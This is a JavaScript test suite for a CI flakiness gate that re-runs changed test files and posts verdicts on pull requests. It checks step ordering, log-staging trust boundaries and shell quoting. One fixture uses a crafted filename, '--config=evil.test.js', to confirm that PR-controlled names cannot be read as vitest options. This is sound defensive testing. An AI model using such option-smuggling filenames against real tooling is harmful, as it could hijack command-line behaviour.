    // And the reset must also run BEFORE round 1: lifecycle scripts (npm
    // ci/build, run as node) mutate the tree between list-record and the
    // first sample, so round 1 must sample the same restored tree as
    // rounds 2..N.
    const firstReset = flakeStep.run.search(/^\s*reset_round_state$/m);
    const loopStart = flakeStep.run.indexOf('while [ "$round" -le "$ROUNDS" ]');
    assert.ok(
      firstReset !== -1 && loopStart !== -1 && firstReset < loopStart,
      'one reset must precede round 1, not only the between-round resets',
    );
    assert.equal(
      flakeStep.if,
      "steps.pr.outputs.decision == 'run' && steps.prepare.outputs.verdict == ''",
      'the gate runs exactly when the agent would (after a clean build)',
    );
    // The message above is only true while both conditions stay identical:
    // if the agent's `if:` drifts wider, the agent publishes a verdict on
    // runs the gate never sampled, and the empty FLAKE_VERDICT leaves the
    // headline untouched (the behavioral drive test proves '' is a no-op).
    assert.equal(
      agentStep.if,
      flakeStep.if,
      'gate and agent must run under identical conditions',
    );
  });

  it('exposes the gate outcome to the publisher and preserves its log', () => {
    assert.equal(
      verifyJob.outputs.flake_verdict,
      '${{ steps.flake.outputs.flake_verdict }}',
    );
    assert.equal(
      verifyJob.outputs.flake_summary,
      '${{ steps.flake.outputs.flake_summary }}',
    );
    assert.equal(
      publishStep.env.FLAKE_VERDICT,
      '${{ needs.verify.outputs.flake_verdict }}',
    );
    assert.equal(
      publishStep.env.FLAKE_SUMMARY,
      '${{ needs.verify.outputs.flake_summary }}',
    );
    // The authoritative log stays root-owned in RUNNER_TEMP and is staged
    // into verify-results by a dedicated always() root step AFTER the agent
    // exits — the last write to that filename. Staging it earlier loses it
    // on an early agent abort, and verify-results is chowned to the build
    // user while PR-controlled agent code runs, so an earlier copy could be
    // rewritten before upload (round-1 review).
    const stageStep = verifyJob.steps.find(
      (s) => s.name === 'Stage flakiness gate log for upload',
    );
    assert.ok(stageStep, 'the staging step must exist');
    assert.equal(
      stageStep.if,
      "always() && steps.pr.outputs.decision == 'run'",
      'staging must survive a failed agent step',
    );
    const agentIdx = verifyJob.steps.indexOf(agentStep);
    const stageIdx = verifyJob.steps.indexOf(stageStep);
    const uploadIdx = verifyJob.steps.findIndex(
      (s) => s.name === 'Upload verify results',
    );
    assert.ok(
      agentIdx < stageIdx && stageIdx < uploadIdx,
      'staging must run after the agent and before the upload',
    );
    // Evidence-copying only, after the verdict outputs are written: a
    // staging failure (ENOSPC, hostile mount) must not flip the job red or
    // the publisher discards the recorded verdict as "infrastructure".
    assert.equal(
      stageStep['continue-on-error'],
      true,
      'staging must not be able to fail the job',
    );
    // The ORDER is the guard (round-4 R2-P1): presence-only pins stayed
    // green with `cp` reordered before the unlinks, reopening the planted
    // FIFO/symlink hazard. Kill racers → drop a planted dir/symlink at the
    // directory level → recreate → unlink the destination entry → copy.
    const sr = stageStep.run;
    const iPkill = sr.indexOf('pkill -KILL -u node');
    const iDirGuard = sr.search(/\[ -L "\$RUNNER_TEMP\/verify-results" \]/);
    const iMkdir = sr.indexOf('mkdir -p "$RUNNER_TEMP/verify-results"');
    const iRmDst = sr.indexOf(
      'rm -rf -- "$RUNNER_TEMP/verify-results/flake-gate.log"',
    );
    const iCp = sr.indexOf(
      'cp -f "$RUNNER_TEMP/flake-gate.log" "$RUNNER_TEMP/verify-results/flake-gate.log"',
    );
    for (const [label, idx] of [
      ['pkill', iPkill],
      ['directory-level symlink/non-dir guard', iDirGuard],
      ['mkdir -p', iMkdir],
      ['destination unlink', iRmDst],
      ['copy', iCp],
    ]) {
      assert.ok(idx !== -1, `staging must contain the ${label}`);
    }
    assert.ok(
      iPkill < iDirGuard &&
        iDirGuard < iMkdir &&
        iMkdir < iRmDst &&
        iRmDst < iCp,
      'staging order must be: kill racers, dir guard, recreate, unlink destination, copy',
    );
    assert.doesNotMatch(
      agentStep.run,
      /flake-gate\.log/,
      'the agent step must not stage the log — that is the wrong trust boundary',
    );
    assert.match(
      publishStep.run,
      /FLAKE_LOG='verify-results\/flake-gate\.log'/,
      'the publisher must pin the exact root-level path, never find/sort',
    );
    assert.match(
      publishStep.run,
      /emit_block 'Flakiness gate log' "\$FLAKE_LOG" 10000/,
      'the gate-log cap must leave headroom under GitHub 65,536-char comment limit next to the 45000 report block',
    );
  });

  it('gate authority is one-way: only `flaky` may touch the headline, and only to demote', () => {
    const block = publishStep.run.match(
      /case "\$\{FLAKE_VERDICT:-\}" in[\s\S]*?esac/,
    );
    assert.ok(
      block,
      'the publisher must map FLAKE_VERDICT through one case block',
    );
    const arms = block[0].split(/;;/);
    for (const arm of arms) {
      const touchesHeadline = /(QUAL|HEADLINE)(_ZH)?=/.test(arm);
      if (!touchesHeadline) continue;
      assert.match(
        arm,
        /^\s*flaky\)/m,
        `only the flaky arm may reassign the headline, found: ${arm.trim().slice(0, 60)}`,
      );
      assert.match(
        arm,
        /QUAL='❌ not passed'/,
        'flaky must demote to not-passed',
      );
      assert.doesNotMatch(
        arm,
        /QUAL='✅/,
        'no gate value may ever set a passing headline',
      );
    }
  });

  it('the flaky demotion also fires when the result artifact is unavailable', () => {
    // FLAKE_VERDICT travels via job outputs, independent of the artifact.
    // Without this branch handling, a flaky PR whose artifact download
    // failed got a neutral "results unavailable" notice — the demotion
    // contract silently not firing.
    const branch = publishStep.run.match(
      /elif \[ "\$\{DOWNLOAD_OUTCOME:-success\}" != "success" \];[\s\S]*?\nelif /,
    );
    assert.ok(branch, 'the download-failure branch must exist');
    assert.match(
      branch[0],
      /"\$\{FLAKE_VERDICT:-\}" = 'flaky'/,
      'the branch must consult the gate verdict',
    );
    assert.match(
      branch[0],
      /❌ not passed — non-deterministic tests \(flakiness gate\)/,
      'flaky must still demote the headline without the artifact',
    );
  });

  it('the verify job timeout still covers agent + prepare + gate', () => {
    // agent 120m + install/build 15m + gate ~25m + misc ~5m — the job limit
    // must stay comfortably above the sum or the container is killed mid-run
    // and the ship-what-ran path is bypassed (see the budget comment).
    assert.ok(
      verifyJob['timeout-minutes'] >= 170,
      `timeout-minutes must cover the gate budget (got ${verifyJob['timeout-minutes']})`,
    );
  });
});

describe('qwen-triage: flakiness gate — behavioral, under the production wrapper', () => {
  // The structural tests above pin the YAML text; these execute the
  // extracted gate and publisher fragments, because YAML inspection cannot
  // observe the runner's own shell contract: every run: block executes
  // under `bash --noprofile --norc -e -o pipefail`, and a `set -uo` script
  // does NOT clear that inherited -e. That exact blind spot shipped the
  // round-1 blocker — the first failing test invocation killed the step —
  // so every scenario here runs under the wrapper, not under a bare bash.
  const flakeRun = verifyJob.steps.find((s) => s.id === 'flake').run;
  const publishRun = doc.jobs['publish-verify'].steps.find(
    (s) => s.name === 'Post verification report comment',
  ).run;

  const STUB_RUNUSER = [
    '#!/bin/bash',
    'while [ "$1" != "--" ]; do shift; done',
    'shift',
    'exec "$@"',
    '',
  ].join('\n');
  // npx/node stub: the last argument is the ./file operand; its scripted
  // outcome sequence lives at $FLAKE_SEQ_DIR/<basename>, consumed one
  // letter per invocation and cycled (missing sequence file = always
  // pass). Letters: P=exit 0, F=exit 1, T=exit 124 (timeout), K=exit 137
  // (signal kill) — T/K model infrastructure exits, not test failures.
  const STUB_TESTRUNNER = [
    '#!/bin/bash',
    'f="${@: -1}"',
    'key="$(basename "$f")"',
    'n_file="$FLAKE_SEQ_DIR/.count-$key"',
    'n=$(cat "$n_file" 2>/dev/null || echo 0)',
    'echo $((n+1)) > "$n_file"',
    'seq="$(cat "$FLAKE_SEQ_DIR/$key" 2>/dev/null || echo P)"',
    'i=$((n % ${#seq}))',
    'm="${seq:$i:1}"',
    '[ "$m" = P ] && exit 0',
    '[ "$m" = T ] && exit 124',
    '[ "$m" = K ] && exit 137',
    'echo "stub failure for $key run $((n+1))"',
    'exit 1',
    '',
  ].join('\n');
  // GNU coreutils `timeout` exists on the Linux runner but not on stock
  // macOS: without a stub every invocation exits 127 off-Linux and every
  // scenario reads consistent-fail. Consume the gate's `-k 30 600` shape
  // and exec the wrapped command.
  const STUB_TIMEOUT = [
    '#!/bin/bash',
    'while [ $# -gt 0 ]; do',
    '  case "$1" in',
    '    -k|--kill-after) shift 2 ;;',
    '    *) break ;;',
    '  esac',
    'done',
    'shift',
    'exec "$@"',
    '',
  ].join('\n');
  // pkill is stubbed for the harness's sake, not the gate's: the real
  // binary would kill processes owned by whoever runs these tests.
  const STUB_PKILL = ['#!/bin/bash', 'exit 0', ''].join('\n');

  const scenarioRoot = mkdtempSync(join(tmpdir(), 'flake-behavioral-'));
  after(() => rmSync(scenarioRoot, { recursive: true, force: true }));

  const runGate = ({
    layout = {},
    list,
    sequences = {},
    stubs = {},
    env: envOverrides = {},
    git = false,
    mutate,
  }) => {
    const root = mkdtempSync(join(scenarioRoot, 'case-'));
    const ws = join(root, 'ws');
    const rt = join(root, 'rt');
    const bin = join(root, 'bin');
    const seqDir = join(root, 'seq');
    for (const d of [ws, rt, bin, seqDir]) mkdirSync(d, { recursive: true });
    for (const [p, content] of Object.entries(layout)) {
      mkdirSync(dirname(join(ws, p)), { recursive: true });
      writeFileSync(join(ws, p), content);
    }
    if (list !== null) writeFileSync(join(rt, 'flake-gate-files'), list);
    for (const [k, v] of Object.entries(sequences)) {
      writeFileSync(join(seqDir, k), v);
    }
    if (git) {
      // A committed tree, so the gate's between-round `git checkout -- .`
      // reset has something to restore (round-state isolation scenarios).
      for (const args of [
        ['init', '-q'],
        ['add', '-A'],
        [
          '-c',
          'user.name=flake-gate',
          '-c',
          'user.email=flake@gate',
          'commit',
          '-qm',
          'fixture',
        ],
      ]) {
        const g = spawnSync('git', args, { cwd: ws, encoding: 'utf8' });
        assert.equal(g.status, 0, `git ${args.join(' ')}: ${g.stderr}`);
      }
    }
    // Applied AFTER the commit: models PR lifecycle scripts (npm ci/build)
    // mutating the tree between list-record and round 1.
    if (mutate) mutate(ws);
    const stubSet = {
      runuser: STUB_RUNUSER,
      npx: STUB_TESTRUNNER,
      node: STUB_TESTRUNNER,
      timeout: STUB_TIMEOUT,
      pkill: STUB_PKILL,
      ...stubs,
    };
    for (const [name, content] of Object.entries(stubSet)) {
      writeFileSync(join(bin, name), content);
      chmodSync(join(bin, name), 0o755);
    }
    const gateFile = join(root, 'gate.sh');
    writeFileSync(gateFile, flakeRun);
    const out = join(rt, 'github-output');
    writeFileSync(out, '');
    writeFileSync(join(rt, 'github-summary'), '');
    const env = {
      ...process.env,
      PATH: `${bin}:${process.env.PATH}`,
      RUNNER_TEMP: rt,
      GITHUB_OUTPUT: out,
      GITHUB_STEP_SUMMARY: join(rt, 'github-summary'),
      FLAKE_ROUNDS: '5',
      FLAKE_SEQ_DIR: seqDir,
      ...envOverrides,
    };
    for (const [k, v] of Object.entries(env)) {
      // An override of undefined deletes the variable (unset scenarios).
      if (v === undefined) delete env[k];
    }
    const res = spawnSync(
      'bash',
      ['--noprofile', '--norc', '-e', '-o', 'pipefail', gateFile],
      {
        cwd: ws,
        env,
        encoding: 'utf8',
        timeout: 60_000,
      },
    );
    const outputs = Object.fromEntries(
      readFileSync(out, 'utf8')
        .split('\n')
        .filter((l) => l.includes('='))
        .map((l) => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]),
    );
    let log = '';
    try {
      log = readFileSync(join(rt, 'flake-gate.log'), 'utf8');
    } catch {
      // a scenario may legitimately abort before creating the log
    }
    return { res, outputs, log };
  };

  const UNIT = {
    'scripts/tests/a.test.js': '',
    'scripts/tests/b.test.js': '',
  };

  it('all-pass rounds land as `pass` with exit 0', () => {
    const { res, outputs } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\nscripts/tests/b.test.js\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
  });

  it('per-file P/F alternation is `flaky` even next to a consistently failing file, and the wrapper -e does not kill the step', () => {
    // One shared exit bit would classify this pair consistent-fail (the
    // FFFFF file masks the PFPFP one); per-file groups must still see the
    // divergence. Every F also exercises the errexit hazard: without
    // `set +e` the first one kills the script under the wrapper.
    const { res, outputs, log } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\nscripts/tests/b.test.js\n',
      sequences: { 'a.test.js': 'F', 'b.test.js': 'PF' },
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'flaky');
    assert.match(log, /a\.test\.js: FFFFF/);
    assert.match(log, /b\.test\.js: PFPFP/);
    // Gate outputs are embedded UNESCAPED into the published comment: they
    // must stay fixed text plus counters, never PR-controlled strings.
    assert.match(
      outputs.flake_summary,
      /^\d+ of \d+ changed test file\(s\) returned different results across identical re-runs \(\d+ full round\(s\)\)$/,
      'the summary must be fixed text plus counters',
    );
    assert.doesNotMatch(
      outputs.flake_summary,
      /a\.test\.js|b\.test\.js/,
      'PR-controlled filenames must stay out of the outputs',
    );
  });

  it('identical failure every round stays informational `consistent-fail`, exit 0', () => {
    const { res, outputs } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\n',
      sequences: { 'a.test.js': 'F' },
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'consistent-fail');
  });

  it('timeout/signal exits are infrastructure, never F marks or fake flakiness', () => {
    // A pass next to an exit-124 round used to publish `flaky`; an OOM
    // kill (137) is the same class. Infra exits must stay out of P/F
    // divergence and land the informational `timeout` verdict instead.
    const { res, outputs, log } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\nscripts/tests/b.test.js\n',
      sequences: { 'a.test.js': 'PT', 'b.test.js': 'K' },
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'timeout');
    assert.match(log, /a\.test\.js: PIPIP/);
    assert.match(log, /b\.test\.js: IIIII/);
    assert.match(log, /exit 124/);
    assert.doesNotMatch(outputs.flake_summary, /a\.test\.js|b\.test\.js/);
  });

  it('real divergence still outranks an infra exit in another file', () => {
    const { res, outputs } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\nscripts/tests/b.test.js\n',
      sequences: { 'a.test.js': 'PF', 'b.test.js': 'PT' },
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'flaky');
  });

  it('round-state reset keeps a tree-mutating deterministic test from faking flakiness', () => {
    // The stub passes only while fixture.txt is pristine, then mutates it.
    // Without the gate's between-round `git checkout -- .` reset, rounds
    // 2-5 fail on round 1's residue (PFFFF -> false flaky); with it every
    // round starts from the committed state again (PPPPP -> pass).
    const STUB_STATEFUL = [
      '#!/bin/bash',
      'if ! grep -q pristine fixture.txt; then',
      '  echo "fixture mutated by an earlier round"',
      '  exit 1',
      'fi',
      'echo mutated > fixture.txt',
      'exit 0',
      '',
    ].join('\n');
    const { res, outputs, log } = runGate({
      layout: {
        'scripts/tests/stateful.test.js': '',
        'fixture.txt': 'pristine\n',
      },
      list: 'scripts/tests/stateful.test.js\n',
      stubs: { npx: STUB_STATEFUL },
      git: true,
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(log, /stateful\.test\.js: PPPPP/);
  });

  it('untracked residue from round 1 is cleaned, not left to fail later rounds', () => {
    // `git checkout -- .` never removes untracked files (round-4 Critical
    // mechanism a): a test whose first invocation leaves an untracked
    // lock/output dir would fail rounds 2-5 on that residue (PFFFF ->
    // false flaky) unless the reset also runs `git clean -fd`.
    const STUB_UNTRACKED = [
      '#!/bin/bash',
      'if [ -e out-residue ]; then',
      '  echo "untracked residue from an earlier round"',
      '  exit 1',
      'fi',
      'mkdir out-residue',
      'exit 0',
      '',
    ].join('\n');
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/untracked.test.js': '' },
      list: 'scripts/tests/untracked.test.js\n',
      stubs: { npx: STUB_UNTRACKED },
      git: true,
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(log, /untracked\.test\.js: PPPPP/);
  });

  it('a pre-gate tree mutation cannot make round 1 sample different content than rounds 2..N', () => {
    // Round-4 Critical mechanism c: PR lifecycle scripts run as node
    // between list-record and round 1. Without a reset BEFORE round 1 the
    // first sample sees the mutated tree and later samples see the
    // restored one — the difference reads as divergence (F then PPPP).
    const STUB_MARKER = [
      '#!/bin/bash',
      'if grep -q clean marker.txt; then exit 0; fi',
      'echo "sampled the lifecycle-mutated tree"',
      'exit 1',
      '',
    ].join('\n');
    const { res, outputs, log } = runGate({
      layout: {
        'scripts/tests/marker.test.js': '',
        'marker.txt': 'clean\n',
      },
      list: 'scripts/tests/marker.test.js\n',
      stubs: { npx: STUB_MARKER },
      git: true,
      mutate: (ws) => writeFileSync(join(ws, 'marker.txt'), 'dirty\n'),
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(log, /marker\.test\.js: PPPPP/);
  });

  it('wall-budget expiry before two full rounds is the informational timeout verdict', () => {
    // A scripted `date` stub drives the clock: deadline init at 0 (so the
    // budget ends at 900), round 1 checked at 100 and run, round 2 checked
    // at 1000 — expired with only one full round done.
    const STUB_DATE = [
      '#!/bin/bash',
      'n_file="$FLAKE_SEQ_DIR/.count-date"',
      'n=$(cat "$n_file" 2>/dev/null || echo 0)',
      'echo $((n+1)) > "$n_file"',
      'mapfile -t vals < "$FLAKE_SEQ_DIR/dates"',
      'i=$n',
      '[ "$i" -ge "${#vals[@]}" ] && i=$((${#vals[@]} - 1))',
      'echo "${vals[$i]}"',
      '',
    ].join('\n');
    const one = runGate({
      layout: { 'scripts/tests/a.test.js': '' },
      list: 'scripts/tests/a.test.js\n',
      stubs: { date: STUB_DATE },
      sequences: { dates: '0\n100\n1000\n' },
    });
    assert.equal(one.res.status, 0, one.res.stderr);
    assert.equal(one.outputs.flake_verdict, 'timeout');
    assert.match(one.outputs.flake_summary, /before two full rounds/);
    // With two agreeing rounds completed before expiry, the summary must
    // say the completed rounds agreed — rounds_done must track completed
    // rounds, not the loop counter.
    const two = runGate({
      layout: { 'scripts/tests/a.test.js': '' },
      list: 'scripts/tests/a.test.js\n',
      stubs: { date: STUB_DATE },
      sequences: { dates: '0\n100\n200\n1000\n' },
    });
    assert.equal(two.res.status, 0, two.res.stderr);
    assert.equal(two.outputs.flake_verdict, 'timeout');
    assert.match(two.outputs.flake_summary, /the completed rounds agreed/);
  });

  it('a space-bearing filename survives the %q quoting as one operand', () => {
    // The operands are re-parsed by `bash -c`: without `printf %q` a space
    // splits the path into two operands, vitest finds no file, and every
    // round fails identically — a bogus consistent-fail without one
    // sample. (Round-4 R2-P3.)
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/has space.test.js': '' },
      list: 'scripts/tests/has space.test.js\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(
      log,
      /has\\ space\.test\.js/,
      'the logged command must carry the escaped, single operand',
    );
  });

  it('a missing recorded list degrades to the `error` verdict, exit 0', () => {
    const { res, outputs } = runGate({ layout: UNIT, list: null });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'error');
  });

  it('out-of-scope families are skipped with logged reasons and land `n/a`', () => {
    const { res, outputs, log } = runGate({
      layout: {
        'integration-tests/x.test.ts': '',
        'packages/web/client/e2e/y.spec.ts': '',
        'packages/bunpkg/package.json': '{}',
        'packages/bunpkg/z.test.ts': '',
      },
      list: [
        'integration-tests/x.test.ts',
        'packages/web/client/e2e/y.spec.ts',
        'packages/bunpkg/z.test.ts',
        '',
      ].join('\n'),
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'n/a');
    assert.match(log, /integration test, out of gate scope/);
    assert.match(log, /e2e suite, out of gate scope/);
    assert.match(log, /no vitest config \(unsupported runner family\)/);
  });

  it('vite.config-only packages and root workspaces outside packages/** are RUN, not skipped', () => {
    // packages/webui's only config is vite.config.ts (vitest resolves it),
    // and integrations/external-context is a root npm workspace no path
    // prefix covers — both are CI-tested, so the gate must re-run them
    // through their owning package instead of logging them out of scope.
    const { res, outputs, log } = runGate({
      layout: {
        'packages/webui/package.json': '{}',
        'packages/webui/vite.config.ts': '',
        'packages/webui/src/x.test.ts': '',
        'integrations/external-context/package.json': '{}',
        'integrations/external-context/vitest.config.ts': '',
        'integrations/external-context/src/y.test.ts': '',
      },
      list: 'packages/webui/src/x.test.ts\nintegrations/external-context/src/y.test.ts\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(
      log,
      /\(cd packages\/webui\) npx --no-install vitest run \.\/src\/x\.test\.ts/,
      'a vite.config-only package must be entered and run',
    );
    assert.match(
      log,
      /\(cd integrations\/external-context\) npx --no-install vitest run \.\/src\/y\.test\.ts/,
      'a root workspace outside packages/** must be entered and run',
    );
    assert.doesNotMatch(log, /, skipped:/);
  });

  it('scripts/tests files outside the pinned vitest include set are skipped, not mis-run', () => {
    // The pinned config only includes *.test.{js,ts}: an admitted .spec.js
    // or .test.mjs would fail collection EVERY round otherwise and publish
    // a bogus consistent-fail.
    const { res, outputs, log } = runGate({
      layout: {
        'scripts/tests/probe.spec.js': '',
        'scripts/tests/probe.test.mjs': '',
        'scripts/tests/probe.test.js': '',
      },
      list: 'scripts/tests/probe.spec.js\nscripts/tests/probe.test.mjs\nscripts/tests/probe.test.js\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(
      log,
      /not in the scripts\/tests vitest include set \(\*\.test\.\{js,ts\}\), skipped: scripts\/tests\/probe\.spec\.js/,
    );
    assert.match(
      log,
      /not in the scripts\/tests vitest include set \(\*\.test\.\{js,ts\}\), skipped: scripts\/tests\/probe\.test\.mjs/,
    );
    assert.match(
      log,
      /\(cd \.\) npx --no-install vitest run --config \.\/scripts\/tests\/vitest\.config\.ts \.\/scripts\/tests\/probe\.test\.js/,
      'the admitted .test.js file must still run',
    );
  });

  it('a nested-workspace file runs from its OWN package, and a leading-dash filename stays an operand', () => {
    const { res, outputs, log } = runGate({
      layout: {
        'packages/channels/base/package.json': '{}',
        'packages/channels/base/vitest.config.ts': '',
        'packages/channels/base/src/p.test.ts': '',
        'scripts/tests/--config=evil.test.js': '',
      },
      list: 'packages/channels/base/src/p.test.ts\nscripts/tests/--config=evil.test.js\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(
      log,
      /\(cd packages\/channels\/base\) npx --no-install vitest run \.\/src\/p\.test\.ts/,
      'the nested package must be entered itself, not its parent',
    );
    assert.match(
      log,
      /\.\/scripts\/tests\/--config=evil\.test\.js/,
      'operands must be ./-prefixed so vitest cannot parse them as options',
    );
  });

  it('an abort before any verdict still fails open via the EXIT trap', () => {
    // RUNNER_TEMP unset kills the script at ${RUNNER_TEMP:?} before a
    // verdict exists; the trap must rewrite that ending into the fixed
    // error outputs and a zero exit (fail-open, never a red step).
    const { res, outputs } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\n',
      env: { RUNNER_TEMP: undefined },
    });
    assert.equal(
      res.status,
      0,
      `the trap must convert the abort to exit 0: ${res.stderr}`,
    );
    assert.equal(outputs.flake_verdict, 'error');
    assert.match(outputs.flake_summary, /aborted before reaching a verdict/);
  });

  it('the .github/scripts node --test arm runs and is logged', () => {
    const { res, outputs, log } = runGate({
      layout: { '.github/scripts/foo.test.mjs': '' },
      list: '.github/scripts/foo.test.mjs\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(log, /node --test \.\/\.github\/scripts\/foo\.test\.mjs/);
  });

  it('FLAKE_ROUNDS is parsed and clamped (default 5, floor 2, cap 10)', () => {
    const roundsInLog = ({ log }) => {
      const m = log.match(/^rounds=(\d+)/m);
      assert.ok(m, 'the gate log header must carry the rounds count');
      return m[1];
    };
    for (const [env, expected] of [
      [{ FLAKE_ROUNDS: undefined }, '5'],
      [{ FLAKE_ROUNDS: 'abc' }, '5'],
      [{ FLAKE_ROUNDS: '99' }, '10'],
    ]) {
      const r = runGate({
        layout: UNIT,
        list: 'scripts/tests/a.test.js\n',
        env,
      });
      assert.equal(r.res.status, 0, r.res.stderr);
      assert.equal(
        roundsInLog(r),
        expected,
        `FLAKE_ROUNDS=${JSON.stringify(env)} must clamp to ${expected}`,
      );
    }
    // The floor is load-bearing: classification needs at least two marks,
    // so at rounds=1 divergence is impossible by construction and every
    // flaky PR would read as pass.
    const floored = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\n',
      sequences: { 'a.test.js': 'PF' },
      env: { FLAKE_ROUNDS: '1' },
    });
    assert.equal(floored.res.status, 0, floored.res.stderr);
    assert.equal(roundsInLog(floored), '2');
    assert.equal(floored.outputs.flake_verdict, 'flaky');
  });

  it('publisher demotion executes one-way: only `flaky` demotes, and it MUST demote', () => {
    const block = publishRun.match(
      /case "\$\{FLAKE_VERDICT:-\}" in[\s\S]*?esac/,
    );
    assert.ok(block, 'the publisher must map FLAKE_VERDICT in a case block');
    const drive = (verdict) => {
      const res = spawnSync(
        'bash',
        [
          '--noprofile',
          '--norc',
          '-e',
          '-o',
          'pipefail',
          '-c',
          [
            "QUAL='✅ passed'",
            "QUAL_ZH='✅ 通过'",
            "HEADLINE='merge-ready (agent verdict)'",
            "HEADLINE_ZH='可合入'",
            "FLAKE_LINE=''",
            "FLAKE_LINE_ZH=''",
            block[0],
            'printf \'%s|%s|%s|%s\' "$QUAL" "$HEADLINE" "$QUAL_ZH" "$HEADLINE_ZH"',
          ].join('\n'),
        ],
        {
          env: {
            ...process.env,
            FLAKE_VERDICT: verdict,
            FLAKE_SUMMARY: '1 of 2 changed test file(s) diverged',
          },
          encoding: 'utf8',
          timeout: 15_000,
        },
      );
      assert.equal(res.status, 0, res.stderr);
      return res.stdout;
    };
    // Both language pairs are asserted (round 4): the Chinese summary line
    // is the ONE verdict a collapsed-details reader sees — if the _ZH
    // assignments drop, a demoted PR renders `判定：✅ 通过` in Chinese
    // while the English headline says ❌.
    for (const v of [
      '',
      'pass',
      'n/a',
      'consistent-fail',
      'timeout',
      'error',
    ]) {
      assert.equal(
        drive(v),
        '✅ passed|merge-ready (agent verdict)|✅ 通过|可合入',
        `'${v}' must not touch the headline in either language`,
      );
    }
    assert.equal(
      drive('flaky'),
      '❌ not passed|non-deterministic tests (flakiness gate)|❌ 不通过|测试结果不确定（抖动门）',
      'flaky must demote in BOTH languages — deleting either pair has to fail this test',
    );
  });
});
